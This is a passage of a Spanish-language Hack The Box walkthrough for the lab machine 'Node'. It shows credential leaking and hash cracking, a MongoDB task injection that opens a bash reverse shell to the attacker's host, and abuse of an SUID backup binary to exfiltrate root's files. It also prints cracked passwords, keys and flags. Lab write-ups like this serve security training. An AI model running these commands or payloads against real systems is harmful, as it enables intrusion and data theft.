&lt;/table&gt;

&lt;h2 id=&quot;explotación&quot;&gt;EXPLOTACION &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Comenzamos usando &lt;code&gt;whatweb&lt;/code&gt;, para determinar las tecnologias que esta usando el servicio web.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ whatweb http://10.10.10.58:3000
http://10.10.10.58:3000 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, IP[10.10.10.58], JQuery, Script[text/javascript], Title[MyPlace], X-Powered-By[Express], X-UA-Compatible[IE=edge]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;La herramienta nos reporta que se trata de un &lt;code&gt;Express&lt;/code&gt;, lo que quiere decir que en el backend esta corriendo &lt;code&gt;NodeJS&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Vamos a proceder a abrir el servicio con el navegador para visualizar el servicio.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Node/node1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos que existe una opcion de login para acceder al servicio.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Node/node2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora ya que sabemos que por dentro corre un &lt;code&gt;nodejs&lt;/code&gt;, para evitar aplicar fuzzing, podemos usar el depurador, para poder ver rutas por defecto del servicio tipo &lt;code&gt;app&lt;/code&gt;. Y dentro descubrimos una ruta de usuarios.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Node/node3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si tratamos de acceder a la ruta, vemos que podemos listar el contenido de usuarios con sus respectivas contraseñas hasheadas.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Node/node4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Procedemos a crackear las contraseñas para ello usaremos nuestra web de confianza.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://crackstation.net/&quot;&gt;https://crackstation.net/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;y Obtenemos contraseñas en texto claro.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Node/node5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;La exportamos al fichero de nombre &lt;code&gt;users.txt&lt;/code&gt; y procedemos a logearnos al servicio.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ cat users.txt
myP14ceAdm1nAcc0uNT:manchester
tom:spongebob
mark:snowflake
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Al conectarnos vemos una opción de &lt;code&gt;DownloadBackup&lt;/code&gt;, asi que lo descargamos y hacemos un decode del contenido que esta en &lt;code&gt;base64&lt;/code&gt; y lo exportamos con el nombre de &lt;code&gt;backup&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Node/node6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ cat myplace.backup | base64 -d &amp;gt; backup
❯ cat backup
❯ file backup
backup: Zip archive data, at least v1.0 to extract
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como resultado obtenemos un comprimido protegido por contraseña.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ unzip backup
Archive:  backup
   creating: var/www/myplace/
[backup] var/www/myplace/package-lock.json password
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Usaremos &lt;code&gt;fcrackzip&lt;/code&gt; y obtenemos la contraeña del comprimido.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ fcrackzip -b -D -u -p /usr/share/wordlists/rockyou.txt backup


PASSWORD FOUND!!!!: pw == magicword
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Dentro observamos bastante contenido, pero al tratarse de un &lt;code&gt;node.js&lt;/code&gt;, podemos tratar de grepear por archivos como &lt;code&gt;app.js&lt;/code&gt;, donde podemos encontrar informacion interesante.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ find . | grep app.js
./www/myplace/app.js
./www/myplace/static/assets/js/app/app.js
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Abrimos el archivo &lt;code&gt;app.js&lt;/code&gt; y encontramos unas credenciales del servicio mongodb, correspondientes al usuario &lt;code&gt;mark&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Node/node7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como vimos que el servicio &lt;code&gt;ssh&lt;/code&gt; se encuentra activo, podemos tratar de conectarnos con las nuevas credenciales.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Wed Sep 27 02:33:14 2017 from 10.10.14.3

              .-. 
        .-'``(|||) 
     ,`\ \    `-`.                 88                         88 
    /   \ '``-.   `                88                         88 
  .-.  ,       `___:      88   88  88,888,  88   88  ,88888, 88888  88   88 
 (:::) :        ___       88   88  88   88  88   88  88   88  88    88   88 
  `-`  `       ,   :      88   88  88   88  88   88  88   88  88    88   88 
    \   / ,..-`   ,       88   88  88   88  88   88  88   88  88    88   88 
     `./ /    .-.`        '88888'  '88888'  '88888'  88   88  '8888 '88888' 
        `-..-(   ) 
              `-` 




The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Tue Jul 18 00:34:52 2023 from 10.10.16.2
mark@node:~$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora que ganamos acceso al sistema como el usuario &lt;code&gt;mark&lt;/code&gt;, listamos los servicios activos y vemos el puerto &lt;code&gt;27017&lt;/code&gt;, correspondiente a &lt;code&gt;MongoDB&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;mark@node:~$ ss -nltp
State       Recv-Q Send-Q                 Local Address:Port                    Peer Address:Port      
LISTEN      0      128                     127.0.0.1:27017                              *:*            
LISTEN      0      128                          *:22                                    *:*       
LISTEN      0      128                        :::3000                                   :::*           
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si ahora listamos los procesos del sistema vemos que se esta corriendo otro &lt;code&gt;app.js&lt;/code&gt; correspondiente a un &lt;code&gt;scheduller&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;mark@node:~$ ps -faux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         2  0.0  0.0      0     0 ?        S    Jul17   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S    Jul17   0:00  \_ [ksoftirqd/0]
mongodb   1237  0.6 11.8 281952 89772 ?        Ssl  Jul17   0:36 /usr/bin/mongod --auth --quiet --config /etc/mongod.conf
tom       1240  0.0  5.5 1008568 42148 ?       Ssl  Jul17   0:02 /usr/bin/node /var/scheduler/app.js
tom       1243  0.0  9.0 1041968 68560 ?       Ssl  Jul17   0:03 /usr/bin/node /var/www/myplace/app.js
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si visualizamos el archivo obtenemos otras credenciales correspondientes a mongo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;mark@node:~$ cat /var/scheduler/app.js
const exec        = require('child_process').exec;
const MongoClient = require('mongodb').MongoClient;
const ObjectID    = require('mongodb').ObjectID;
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&amp;amp;authSource=scheduler';

MongoClient.connect(url, function(error, db) {
  if (error || !db) {
    console.log('[!] Failed to connect to mongodb');
    return;
  }

  setInterval(function () {
    db.collection('tasks').find().toArray(function (error, docs) {
      if (!error &amp;amp;&amp;amp; docs) {
        docs.forEach(function (doc) {
          if (doc) {
            console.log('Executing task ' + doc._id + '...');
            exec(doc.cmd);
            db.collection('tasks').deleteOne({ _id: new ObjectID(doc._id) });
          }
        });
      }
      else if (error) {
        console.log('Something went wrong: ' + error);
      }
    });
  }, 30000);

});
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nos conectamos la servicio con las nuevas credenciales obtenidas, listamos las colecciones de la base de datos.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;mark@node:~$ mongo -u mark -p 5AYRft73VtFpc84k scheduler
MongoDB shell version: 3.2.16
connecting to: scheduler
&amp;gt; show collections
tasks
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;En la colección &lt;code&gt;tasks&lt;/code&gt;, vamos a usar &lt;code&gt;db.task.find()&lt;/code&gt; tal y como vemos en el script &lt;code&gt;app.js&lt;/code&gt; para realizar consultas en la colección &lt;code&gt;tasks&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;&amp;gt; db.tasks.find()
&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;La consulta no nos lista nada, pero si volvemos a revisar &lt;code&gt;app.js&lt;/code&gt; obervamos &lt;code&gt;exec(doc.cmd);&lt;/code&gt; que se esta validando el uso de un campo llamado &lt;code&gt;cmd&lt;/code&gt;, asi que podriamos tratar de  insertar un nuevo documento con &lt;code&gt;db.tasks.insert()&lt;/code&gt; incorporando el &lt;code&gt;cmd&lt;/code&gt; y ejecutando un comando aprovechandonos de la función &lt;code&gt;exec&lt;/code&gt;y asi otorgarnos una &lt;code&gt;revershell&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;&amp;gt; db.tasks.insert({&quot;cmd&quot;: &quot;bash -c 'bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.16.2/443 0&amp;gt;&amp;amp;1'&quot;})
WriteResult({ &quot;nInserted&quot; : 1 })
&amp;gt; db.tasks.find()
{ &quot;_id&quot; : ObjectId(&quot;64b5d7e418c6053c65dd5030&quot;), &quot;cmd&quot; : &quot;bash -c 'bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.16.2/443 0&amp;gt;&amp;amp;1'&quot; }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora nos ponemos en escucha en nuestra equipo y recibimos la conexión como el usuario &lt;code&gt;tom&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.58.
Ncat: Connection from 10.10.10.58:44564.
bash: cannot set terminal process group (1240): Inappropriate ioctl for device
bash: no job control in this shell
To run a command as administrator (user &quot;root&quot;), use &quot;sudo &amp;lt;command&amp;gt;&quot;.
See &quot;man sudo_root&quot; for details.

tom@node:/$ whoami
whoami
tom
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora podemos dirigirnos al directorio personal del usuario y visualizar la primera flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;tom@node:/$ cd /home/tom
cd /home/tom
tom@node:~$ cat user.txt
cat user.txt
4452fba153c742ca44fd79aac0f934c9
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;ELEVACION DE PRIVILEGIOS &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Listando los binarios con privilegios &lt;code&gt;suid&lt;/code&gt;, encontramos uno inusual llamando &lt;code&gt;backup&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;tom@node:/$ find / -perm -4000 2&amp;gt;/dev/null
find / -perm -4000 2&amp;gt;/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/local/bin/backup
/usr/bin/chfn
/usr/bin/at
/usr/bin/gpasswd
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/newuidmap
/bin/ping
/bin/umount
/bin/fusermount
/bin/ping6
/bin/ntfs-3g
/bin/su
/bin/mount
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si tratamos de ejecutar el binario, vemos que no sucede nada.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;tom@node:/$ /usr/local/bin/backup
/usr/local/bin/backup
tom@node:/$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Pero si volvemos a visualizar el &lt;code&gt;app.js&lt;/code&gt; que listamos al principio el cual estaba contenido en el comprimido, observamos una ruta correspondiente a &lt;code&gt;backup&lt;/code&gt; la cual se ejecuta con 3 parametros, entre ellos una key y un directorio.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Node/node8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Probamos nuevamente a ejecutarlo con 3 parametros.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;om@node:/$ /usr/local/bin/backup a a a
/usr/local/bin/backup a a a



             ____________________________________________________
            /                                                    \
           |    _____________________________________________     |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |             Secure Backup v1.0              |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |_____________________________________________|    |
           |                                                      |
            \_____________________________________________________/
                   \_______________________________________/
                _______________________________________________
             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
 _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_
:-----------------------------------------------------------------------------:
`---._.-----------------------------------------------------------------._.---'


 [!] Ah-ah-ah! You didn't say the magic word!


tom@node:/$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vemos que esta vez funciona, pero ahora usaremos ltrace para ver a bajo nivel el proceso de lo que sucede al ejecutar el binario.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;tom@node:/$ ltrace /usr/local/bin/backup a b c
ltrace /usr/local/bin/backup a b c
strncpy(0xffef6578, &quot;b&quot;, 100)                                                                                     = 0xffef6578
strcpy(0xffef6561, &quot;/&quot;)                                                                                           = 0xffef6561
strcpy(0xffef656d, &quot;/&quot;)                                                                                           = 0xffef656d
strcpy(0xffef64f7, &quot;/e&quot;)                                                                                          = 0xffef64f7
strcat(&quot;/e&quot;, &quot;tc&quot;)                                                                                                = &quot;/etc&quot;
strcat(&quot;/etc&quot;, &quot;/m&quot;)                                                                                              = &quot;/etc/m&quot;
strcat(&quot;/etc/m&quot;, &quot;yp&quot;)                                                                                            = &quot;/etc/myp&quot;
strcat(&quot;/etc/myp&quot;, &quot;la&quot;)                                                                                          = &quot;/etc/mypla&quot;
strcat(&quot;/etc/mypla&quot;, &quot;ce&quot;)                                                                                        = &quot;/etc/myplace&quot;
strcat(&quot;/etc/myplace&quot;, &quot;/k&quot;)                                                                                      = &quot;/etc/myplace/k&quot;
strcat(&quot;/etc/myplace/k&quot;, &quot;ey&quot;)                                                                                    = &quot;/etc/myplace/key&quot;
strcat(&quot;/etc/myplace/key&quot;, &quot;s&quot;)                                                                                   = &quot;/etc/myplace/keys&quot;
fopen(&quot;/etc/myplace/keys&quot;, &quot;r&quot;)                                                                                   = 0x8c06410
fgets(&quot;a01a6aa5aaf1d7729f35c8278daae30f&quot;..., 1000, 0x8c06410)                                                     = 0xffef610f
strcspn(&quot;a01a6aa5aaf1d7729f35c8278daae30f&quot;..., &quot;\n&quot;)                                                              = 64
strcmp(&quot;b&quot;, &quot;a01a6aa5aaf1d7729f35c8278daae30f&quot;...)                                                                = 1
fgets(&quot;45fac180e9eee72f4fd2d9386ea7033e&quot;..., 1000, 0x8c06410)                                                     = 0xffef610f
strcspn(&quot;45fac180e9eee72f4fd2d9386ea7033e&quot;..., &quot;\n&quot;)                                                              = 64
strcmp(&quot;b&quot;, &quot;45fac180e9eee72f4fd2d9386ea7033e&quot;...)                                                                = 1
fgets(&quot;3de811f4ab2b7543eaf45df611c2dd25&quot;..., 1000, 0x8c06410)                                                     = 0xffef610f
strcspn(&quot;3de811f4ab2b7543eaf45df611c2dd25&quot;..., &quot;\n&quot;)                                                              = 64
strcmp(&quot;b&quot;, &quot;3de811f4ab2b7543eaf45df611c2dd25&quot;...)                                                                = 1
fgets(&quot;\n&quot;, 1000, 0x8c06410)                                                                                      = 0xffef610f
strcspn(&quot;\n&quot;, &quot;\n&quot;)                                                                                               = 0
strcmp(&quot;b&quot;, &quot;&quot;)                                                                                                   = 1
fgets(nil, 1000, 0x8c06410)                                                                                       = 0
strcpy(0xffef5148, &quot;Ah-ah-ah! You didn't say the mag&quot;...)                                                         = 0xffef5148
printf(&quot; %s[!]%s %s\n&quot;, &quot;\033[33m&quot;, &quot;\033[37m&quot;, &quot;Ah-ah-ah! You didn't say the mag&quot;... [!] Ah-ah-ah! You didn't say the magic word!
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Observamos que compara el segundo campo &lt;code&gt;b&lt;/code&gt; con una key de un archivo &lt;code&gt;/etc/myplace/keys&lt;/code&gt; que si lo listamos podemos ver el contenido.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;tom@node:/$ cat /etc/myplace/keys
cat /etc/myplace/keys
a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508
45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474
3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Podemos usar una de las keys y como tercer parametro ya que nos pide ingresar un directorio, podriamos tratar de visualizar la flag de root.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;/usr/local/bin/backup a 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 root



             ____________________________________________________
            /                                                    \
           |    _____________________________________________     |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |             Secure Backup v1.0              |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |_____________________________________________|    |
           |                                                      |
            \_____________________________________________________/
                   \_______________________________________/
                _______________________________________________
             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
 _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_
:-----------------------------------------------------------------------------:
`---._.-----------------------------------------------------------------._.---'


 [+] Validated access token
 [+] Starting archiving root
 [+] Finished! Encoded backup is below:

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
&lt;/code&gt;&lt;/pre&gt;

